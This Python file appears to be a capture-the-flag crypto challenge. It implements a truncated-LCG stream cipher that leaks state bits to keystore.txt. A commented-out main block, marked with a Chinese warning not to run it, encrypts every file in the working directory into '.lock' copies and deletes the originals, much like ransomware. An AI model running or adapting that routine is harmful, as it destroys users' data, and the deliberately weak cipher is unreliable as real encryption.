import os
from Crypto.Util.number import *
import random

class YSenc:

    def __init__(self,key) -> None:
        self.shift = 128-32
        self.m = 297962456582253955990046250846979218011
        self.a = 71211951805712323543315295789950870568
        self.b = 215968094306987982220961475017392133478
        self.x = key

    def _next(self):
        self.x = (self.a*self.x + self.b) % self.m

    
    def kx(self,n):
        Y = []
        X = []
        kx = b""
        while len(kx) < n:
            Y.append(self.x >> self.shift)
            X.append(self.x)
            kx += self.x.to_bytes(16,"big")
            self._next()
        f = open("keystore.txt","w")
        f.write(f"Y={Y}")
        return kx
    
    def encrypt(self,plaintext):
        return bytes(x ^ y for x, y in zip(plaintext, self.kx(len(plaintext))))
    


# 别运行！！！！！！！！！！！！！！！！

# if __name__ == "__main__":
#     key = random.getrandbits(128)
#     ys = YSenc(key)
#     current_directory = os.getcwd()  
#     files = [f for f in os.listdir(current_directory) if os.path.isfile(os.path.join(current_directory, f))]
#     for file in files:
#         if file == os.path.basename(os.path.abspath(__file__)):
#             pass
#         else:
#             f = open(file,"rb")
#             data = f.read()
#             f.close()
#             res = open(file+".lock","wb")
#             res.write(ys.encrypt(data))
#             os.remove(file)
